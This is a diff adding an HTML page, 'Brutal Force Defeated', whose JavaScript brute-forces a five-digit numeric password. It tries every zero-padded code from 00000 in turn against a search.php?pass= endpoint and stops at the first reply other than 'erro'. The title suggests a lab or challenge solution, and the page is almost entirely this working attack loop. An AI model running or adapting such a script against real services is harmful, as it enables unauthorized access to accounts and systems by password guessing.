@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brutal Force Defeated</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>   
+</head>
+<body>  
+    <script>   
+        j=0;
+
+        function consultar(pass){   
+            response = "";  
+            $.ajax({               
+               url : "search.php?pass=" + pass,
+               async: false,
+               method: 'get',
+               success: function(msg){
+                   response = msg;    
+               }
+            }); 
+            return(response);    
+        }
+    
+        function mascara(numero){
+            con = "";
+            str = String(numero);
+            tamanho = str.length;
+            tamanho = 5 - tamanho;
+            for(i=0;i<tamanho;i++){
+                con += "0";
+            }
+            return (con + str);
+        }
+
+        response = "erro";
+        while(response == "erro"){
+            response = consultar(mascara(j));
+            console.log(response);
+            j++;
+        }
+
+        alert(response);
+           
+    </script>
+</body>
+ 
+</html>
